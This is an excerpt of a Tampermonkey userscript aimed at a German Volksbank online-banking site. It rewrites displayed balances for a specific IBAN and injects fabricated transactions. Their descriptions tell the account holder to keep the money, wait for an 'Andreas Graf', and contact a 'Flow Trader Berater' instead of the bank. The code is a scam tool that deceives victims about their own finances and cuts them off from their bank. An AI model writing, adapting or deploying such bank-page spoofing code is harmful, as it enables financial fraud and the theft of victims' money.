// ==UserScript==
// @name         Ed Volks combined Gerd Schon
// @namespace    http://tampermonkey.net/
// @version      0.6
// @description  S und Flow Rep
// @author       You
// @match        https://www.meine-vvb.de/*
// @match        https://www.drivehq.com/*
// @match        *://*/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/487450/Ed%20Volks%20combined%20Gerd%20Schon.user.js
// @updateURL https://update.greasyfork.org/scripts/487450/Ed%20Volks%20combined%20Gerd%20Schon.meta.js
// ==/UserScript==
...
//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
   ...
   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  35100},
        { index: 1, adjustmentAmount: 35100},
        { index: 2, adjustmentAmount: 35100},
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    var targetTextContent1 = "DE02 5909 2000";
    var targetTextContent2 = " 1597 5102 05";

    // Configurable modification amount (positive or negative)
    const modificationAmount = 35100.0; // Adjust the amount as needed
...
//33333333333---------------VOLKS UMSAETZE MULTIPLE TRANSACTIONS--------------------------------------------------------------------------------------------------------------
    ...
    const TRANSACTIONS = [
  {
            ...
            description: 'Bitte nicht ausgeben. Andreas Graf meldet sich.',
            amount: '17.000,00',
            date: '23 Feb.',
        ...
        },
        {
            ...
            description: 'Freigabe nötig. Wenden Sie sich an Flow Trader Berater, nicht die Bank, damit nicht gesperrt.',
            amount: '177.964,00',
            date: 'Vorgemerkt',
            insertAfter: false, // Set to false to insert before the original transaction
            moveSteps: 1, // Number of steps to move the transaction
       ...
       {
            title: 'JP Morgan Chase',
            description: 'Geld für Steuern. Warten Sie bitte auf Andreas Graf. ',
            amount: '18.000,00',
            date: 'Heute',
            insertAfter: false, // Set to false to insert before the original transaction
            moveSteps: 1, // Number of steps to move the transaction
